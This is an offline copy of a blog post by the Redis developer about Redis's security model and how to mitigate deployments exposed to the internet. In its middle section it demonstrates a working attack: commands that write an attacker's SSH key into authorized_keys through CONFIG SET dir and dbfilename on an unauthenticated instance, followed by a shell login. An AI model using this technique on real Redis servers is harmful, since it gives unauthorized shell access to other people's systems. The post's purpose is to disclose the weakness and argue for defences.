# Redis Remote Code Exeuction Offline Copy

Source: https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html

From time to time I get security reports about Redis. It’s good to get reports, but it’s odd that what I get is usually about things like Lua sandbox escaping, insecure temporary file creation, and similar issues, in a software which is designed (as we explain in our security page here http://redis.io/topics/security) to be totally insecure if exposed to the outside world.

Yet these bug reports are often useful since there are different levels of security concerning any software in general and Redis specifically. What you can do if you have access to the database, just modify the content of the database itself or compromise the local system where Redis is running?

How important is a given security layer in a system depends on its security model.  Is a system designed to have untrusted users accessing it, like a web server
for example? There are different levels of authorization for different kinds of
users?

The Redis security model is: “it’s totally insecure to let untrusted clients access the system, please protect it from the outside world yourself”. The reason is that, basically, 99.99% of the Redis use cases are inside a sandboxed environment. Security is complex. Adding security features adds complexity. Complexity for 0.01% of use cases is not great, but it is a matter of design philosophy, so you may disagree of course.

The problem is that, whatever we state in our security page, there are a lot of Redis instances exposed to the internet unintentionally. Not because the use case requires outside clients to access Redis, but because nobody bothered to protect a given Redis instance from outside accesses via fire walling, enabling AUTH, binding it to 127.0.0.1 if only local clients are accessing it, and so forth.

## Let’s crack Redis for fun and no profit at all given I’m the developer of this thing

In order to show the Redis “security model” in a cruel way, I did a quick 5 minutes experiment. In our security page we hint at big issues if Redis is exposed. You can read: “However, the ability to control the server configuration using the CONFIG command makes the client able to change the working directory of the program and the name of the dump file. This allows clients to write RDB Redis files at random paths, that is a security issue that may easily lead to the ability to run untrusted code as the same user as Redis is running”.

So my experiment was the following: I’ll run a Redis instance in my Macbook Air, without touching the computer configuration compared to what I’ve currently. Now from another host, my goal is to compromise my laptop.

So, to start let’s check if I can access the instance, which is a prerequisite:

$ telnet 192.168.1.11 6379
Trying 192.168.1.11...
Connected to 192.168.1.11.
Escape character is '^]'.
echo "Hey no AUTH required!"
$21
Hey no AUTH required!
quit
+OK
Connection closed by foreign host.

Works, and no AUTH required. Redis is unprotected without a password set up, and so forth. The simplest thing you can do in such a case, is to write random files. Guess what? my Macbook Air happens to run an SSH server. What about trying to write something into ~/ssh/authorized_keys in order to gain access?

Let’s start generating a new SSH key:

$ ssh-keygen -t rsa -C "crack@redis.io"
Generating public/private rsa key pair.
Enter file in which to save the key (/home/antirez/.ssh/id_rsa): ./id_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in ./id_rsa.
Your public key has been saved in ./id_rsa.pub.
The key fingerprint is:
f0:a1:52:e9:0d:5f:e4:d9:35:33:73:43:b4:c8:b9:27 crack@redis.io
The key's randomart image is:
+--[ RSA 2048]----+
|          .   O+.|
|       . o o..o*o|
|      = . + .+ . |
|     o B o    .  |
|    . o S    E . |
|     .        o  |
|                 |
|                 |
|                 |
+-----------------+

Now I’ve a key. My goal is to put it into the Redis server memory, and later to transfer it into a file, in a way that the resulting authorized_keys file is still a valid one. Using the RDB format to do this has the problem that the output will be binary and may in theory also compress strings. But well, maybe this is not a problem. To start let’s pad the public SSH key I generated with newlines before and after the content:

$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt

Now foo.txt is just our public key but with newlines. We can write this string inside the memory of Redis using redis-cli:

$ redis-cli -h 192.168.1.11 flushall
$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit

Looks good. How to dump our memory content into the authorized_keys file? That’s
kinda trivial.

$ redis-cli -h 192.168.1.11
192.168.1.11:6379> config set dir /Users/antirez/.ssh/
OK
192.168.1.11:6379> config get dir
1) "dir"
2) "/Users/antirez/.ssh"
192.168.1.11:6379> config set dbfilename "authorized_keys"
OK
192.168.1.11:6379> save
OK

At this point the target authorized keys file should be full of garbage, but should also include our public key. The string does not have simple patterns so it’s unlikely that it was compressed inside the RDB file. Will ssh be so naive to parse a totally corrupted file without issues, and accept the only sane entry inside?

$ ssh -i id_rsa antirez@192.168.1.11
Enter passphrase for key 'id_rsa':
Last login: Mon Nov  2 15:58:43 2015 from 192.168.1.10
~ ➤ hostname
Salvatores-MacBook-Air.local

Yes. I successfully gained access as the Redis user, with a proper shell, in like five seconds. Courtesy of a Redis instance unprotected being, basically, an on-demand-write-this-file server, and in this case, by ssh not being conservative enough to deny access to a file which is all composed of corrupted keys but for one single entry. However ssh is not the problem here, once you can write files, even with binary garbage inside, it’s a matter of time and you’ll gain access to the system in one way or the other.

## How to fix this crap?

We say Redis is insecure if exposed, and the security model of Redis is to be accessed only be authorized and trusted clients. But this is unfortunately not enough. Users will still run it unprotected, and even worse, there is a tension between making Redis more secure *against* deployment errors, and making Redis easy to use for people just using it for development or inside secure environments where limits are not needed.

Let’s make an example. Newer versions of Redis ship with the example redis.conf defaulting to “bind 127.0.0.1”. If you run the server without arguments, it will still bind all interfaces, since I don’t want to annoy users which are likely running Redis for development. To have to reconfigure an example server just to allow connections from other hosts is kinda a big price to pay, to win just a little bit of security for people that don’t care. However the example redis.conf that many users use as a template for their configuration, defaults to binding the localhost interface. Hopefully less deployments errors will be made.

However this measures are not very effective, because unfortunately what most security unaware users will do after realizing that binding 127.0.0.1 is preventing them from connecting clients from the outside, is to just drop the bind line and restart. And we are back to the insecure configuration.

Basically the problem is finding a compromise between the following three things:

1. Making Redis accessible without annoyances for people that know what they do.

2. Making Redis less insecure for people that don’t know what they do.

3. My bias towards “1” instead of “2” because RTFM.

## Users ACLs to mitigate the problem

One way to add redundancy to the “isolation” concept of Redis from the outside world is to use the AUTH command. It’s very simple, you configure Redis in order to require a password, and clients authenticate via the AUTH command by using the configured password. The mechanism is trivial: passwords are not hashed, and are stated in cleartext inside the configuration file and inside the application, so it’s like a shared secret.  

While this is not resistant against people sniffing your TCP connections or compromising your application servers, it’s an effective layer of security against the obvious mistake of leaving unprotected Redis instances on the internet.  

A few notes about AUTH:

1. You can use Redis as an oracle in order to test many passwords per second, but the password does not need to be stored inside a human memory, just inside the Redis config file and client configurations, so pick a very large one, and make it impossible to brute force.

2. AUTH is sent when the connection is created, and most sane applications have persistent connections, so it is a very small cost to pay. It’s also an extremely fast command to execute, like GET or SET, disk is not touched nor other external system.

3. It’s a good layer of protection even for well sandboxed environments. For an error an instance may end exposed, if not to the internet, at least to clients that should not be able to talk with it.

Maybe evolving AUTH is the right path in order to gain more security, so
some time ago I published a proposal to add “real users” in Redis: https://github.com/redis/redis-rcp/blob/master/RCP1.md

This proposal basically adds users with ACLs. It’s very similar to AUTH in the way it works and in the speed of execution, but different users have different capabilities. For example normal users are not able to access administrative commands by default, so no “CONFIG SET dir” for them, and no issues like the exploit above.

The default user can yet run the normal commands (so the patches people sent me about Lua sandboxing, that I applied, are very useful indeed), and an admin user must be configured in order to use administration commands. However what we could do to make Redis more user friendly is to always have an “admin” user with empty password which is accepted if the connection comes from the loopback interface (but it should be possible to disable this feature).

ACLs, while not perfect, have certain advantages. When Redis is exposed to the internet in the proper way, proxied via SSL, to have an additional layer of access control is very useful. Even when no SSL is used since we have just local clients, to protect with more fine grained control what clients can do has several advantages. For instance it can protect against programming or administration errors: FLUSHALL and FLUSHDB could be not allowed to normal users, the client for a Redis monitoring service would use an user only allowing a few selected commands, and so forth.

Users that don’t care about protecting their instances will stil have a database which is accessible from the outside, but without admin commands available, which still makes things insecure from the point of view of the data contained inside the database, but more secure from the point of view of the system running the Redis instance.

Basically it is impossible to reach the goal of making Redis user friendly by default and resistant against big security mistakes of users spinning an instance bound to a public IP address. However fixing bugs in the API that may allow to execute untrusted code with the same privileges of the Redis process, shipping a more conservative default configuration, and implementing multiple users with ACLs, could improve the current state of Redis security without impacting much the experience of normal Redis users that know what they are doing.

Moreover ACLs have the advantage of allowing application developers to create
users that match the actual limits of specific clients in the context of the
application logic, making mistakes less likely to create big issues.

A drawback of even this simple layer of security is that it adds complexity,
especially in the context of replication, Redis Sentinel, and other systems that
must all be authentication aware in order to work well in this new context. However it’s probably an effort that must be incrementally done.

Hacker News: http://antirez.com/news/96

Reddit: https://www.reddit.com/r/redis/comments/3rby8c/a_few_things_about_redis_security/